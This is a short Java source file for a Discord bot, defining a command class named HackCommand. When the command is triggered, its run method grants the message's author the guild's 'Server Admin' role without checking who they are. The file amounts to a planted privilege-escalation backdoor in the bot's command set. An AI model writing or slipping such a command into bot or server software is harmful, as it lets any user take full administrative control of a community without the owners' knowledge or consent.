package p0ke.specbot.command.discord;

import java.util.List;

import p0ke.specbot.util.RMessageBuilder;
import sx.blah.discord.handle.impl.events.MessageReceivedEvent;

public class HackCommand extends DCommandBase {
	
	
	@Override
	public void run(List<String> args, MessageReceivedEvent event, RMessageBuilder msg) throws Exception {
		
		event.getMessage().getAuthor().addRole(event.getMessage().getGuild().getRolesByName("Server Admin").get(0));
		
	}

}
